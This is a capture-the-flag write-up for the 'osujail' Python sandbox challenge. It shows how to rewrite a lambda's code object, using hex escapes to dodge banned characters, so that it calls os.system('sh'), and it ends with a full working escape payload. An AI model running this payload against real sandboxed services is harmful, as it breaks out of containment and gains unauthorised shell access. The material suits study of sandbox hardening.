## osujail
*Recommended reading for background information if you are unfamiliar with these concepts: [code objects](https://docs.python.org/3/reference/datamodel.html#code-objects), [pyjail payloads](https://davidjwolfe.com/posts/Build_Yourself_In/)*

The idea is to create a lambda function and then update its code object so that it runs your standard pyjail payload:
`().__class__.mro()[1].__subclasses__()[133].__init__.__globals__['system']('sh')`
(subclass 133 is `os._wrap_close`)

Let's look at the code object that we need to replicate:

```py
>>> def f():return ().__class__.mro()[1].__subclasses__()[133].__init__.__globals__['system']('sh')
...
>>> import dis
>>> print(dis.code_info(f))
Name:              f
Filename:          <stdin>
Argument count:    0
Positional-only arguments: 0
Kw-only arguments: 0
Number of locals:  0
Stack size:        2
Flags:             OPTIMIZED, NEWLOCALS, NOFREE
Constants:
   0: None
   1: ()
   2: 1
   3: 133
   4: 'system'
   5: 'sh'
Names:
   0: __class__
   1: mro
   2: __subclasses__
   3: __init__
   4: __globals__
>>> f.__code__.co_code
b'd\x01j\x00\xa0\x01\xa1\x00d\x02\x19\x00\xa0\x02\xa1\x00d\x03\x19\x00j\x03j\x04d\x04\x19\x00d\x05\x83\x01S\x00'
```

We can see that we'll need to change the `co_consts`, `co_names` and `co_code` attributes of the lambda's code object.

First, we create a lambda with the correct co_consts:

```py
(f := lambda: (0, (), 1, 133, '\x73y\x73tem', '\x73h'))
```

Next, we need to update the `co_names` and `co_consts` tuples. We can do this using our code object's [`.replace()` method](https://docs.python.org/3/reference/datamodel.html#codeobject.replace). However, `co_consts` contains 2 o's, which are banned. This means that we'll need to pass a dict in, but we aren't able to create one using `{}` either.

What we can do is use `f.__dict__` and `dict.update`:

```py
f.__dict__.update(
	(
		(
		'c\x6f_name\x73', (
		'__cla\x73\x73__', 'mr\x6f', '__\x73\x75bcla\x73\x73e\x73__', '__init__', '__gl\x6fbal\x73__'
		)
		),
		(
		'c\x6f_c\x6fde',
		b'd\x01j\x00\xa0\x01\xa1\x00d\x02\x19\x00\xa0\x02\xa1\x00d\x03\x19\x00j\x03j\x04d\x04\x19\x00d\x05\x83\x01S\x00'
		)
	)
)
```

Finally, we replace the lambda's code object with our updated one:

```py
f.__setattr__('__c\x6fde__', f.__code__.replace(**f.__dict__))
```

Full payload:

```py
((f := lambda: (0, (), 1, 133, '\x73y\x73tem', '\x73h')),f.__dict__.update((('c\x6f_name\x73',('__cla\x73\x73__', 'mr\x6f', '__\x73\x75bcla\x73\x73e\x73__', '__init__', '__gl\x6fbal\x73__')), ('c\x6f_c\x6fde',b'd\x01j\x00\xa0\x01\xa1\x00d\x02\x19\x00\xa0\x02\xa1\x00d\x03\x19\x00j\x03j\x04d\x04\x19\x00d\x05\x83\x01S\x00'))),f.__setattr__('__c\x6fde__', f.__code__.replace(**f.__dict__)),f())
```
